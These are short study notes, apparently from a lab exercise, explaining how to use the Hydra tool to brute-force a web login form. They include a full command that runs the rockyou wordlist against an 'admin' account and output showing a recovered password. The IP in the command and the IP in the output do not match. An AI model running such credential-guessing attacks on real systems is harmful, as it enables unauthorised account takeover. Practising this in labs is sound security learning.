EXPLAIN: 

sudo hydra <Username/List> <Password/List> <IP> <Method> "<Path>:<RequestBody>:<IncorrectVerbiage>"
-l -L      username to attack with  - OR -  list of username
-p -P      password to attack with   - OR -  list of passwd
-f  -F     exit quand une paire est trouvée - OR - trouvées. 

<Method>            : http-get-form 
<Path>              : /index.php
<RequestBody>       : page=signin&username=^USER^&password=^PASS^&Login=Login
                      ^SMTHG ^ va dire à Hydra d’entrer les mots de la liste à la place.
<IncorrectVerbiage> : images/WrongAnswer.gif

hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz -f 192.168.1.87 http-get-form '/index.php:page=signin&username=admin&password=^PASS^&Login=Login:images/WrongAnswer.gif'

[80][http-get-form] host: 192.168.1.17 login: admin password: shadow
